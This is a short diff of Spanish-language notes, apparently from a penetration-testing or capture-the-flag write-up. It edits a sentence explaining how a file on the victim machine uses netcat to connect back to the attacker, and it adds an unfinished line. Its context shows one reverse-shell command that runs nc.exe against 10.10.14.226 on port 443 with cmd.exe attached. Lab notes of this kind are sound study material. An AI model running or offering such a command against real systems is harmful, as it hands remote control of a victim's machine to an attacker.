@@ -171,8 +171,8 @@ Ahora deberemos de descargar en la maquina victima en la ruta `C:\temp` los scri
 C:\temp\nc.exe 10.10.14.226 443 -e cmd.exe
 ```
 
-Este archivito se encarga de a través de [[NETCAT]] entablar una conexión  con nuestra maquina atacante
-
+Este archivito se encarga de a través de [[NETCAT]] entablar una conexión con nuestra maquina atacante
+El archivo lo crearemos en nuestra maquina atacante y lo com
 
 
 
